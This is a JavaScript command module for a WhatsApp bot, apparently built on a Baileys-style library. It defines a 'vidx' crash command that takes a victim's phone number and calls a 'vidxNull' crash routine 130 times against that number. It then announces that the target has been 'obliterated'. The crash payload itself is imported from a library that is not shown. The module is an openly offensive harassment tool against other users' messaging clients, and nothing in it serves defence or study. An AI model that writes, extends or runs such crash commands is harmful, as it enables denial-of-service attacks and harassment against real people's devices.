'use strict';
const { CrashLib } = require('../../lib/crashlib');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'vidx',
    aliases: ['vidxnull', 'videonull', 'vidcrash'],
    category: 'crash',
    desc: 'ᴠɪᴅᴇᴏ ɴᴜʟʟ ᴄʀᴀsʜ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
    usage: '.vidx <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}vidx <number>\n📝 *Example:* ${prefix}vidx 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let crashLib = global.getCrashLib?.(sock);
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        const TOTAL = 130;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                await crashLib.vidxNull(target);
                await bar.update(1, 'ᴠɪᴅx ɴᴜʟʟ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 120));
            }
            
            await bar.done(`✅ ᴠɪᴅx ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
        } catch (e) {
            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
        }
    }
};